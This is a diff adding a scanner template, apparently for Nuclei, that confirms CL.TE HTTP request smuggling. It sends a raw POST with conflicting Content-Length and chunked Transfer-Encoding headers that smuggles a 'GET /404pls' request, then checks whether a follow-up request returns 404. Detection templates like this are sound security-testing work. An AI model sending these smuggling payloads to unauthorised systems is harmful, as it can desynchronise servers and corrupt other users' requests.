@@ -1,0 +1,31 @@
+id: confirming-cl-te-basic
+
+info:
+  name: confirming-cl-te-basic
+  author: FIR_UIII
+  severity: info
+  reference: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting
+
+http:
+  - raw:
+    - |+
+      POST / HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Content-Length: 35
+      Transfer-Encoding: chunked
+
+      0
+
+      GET /404pls HTTP/1.1
+      X-Foo: x
+      
+    - |+
+      GET / HTTP/1.1
+      Host: {{Hostname}}
+      
+    unsafe: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==404'
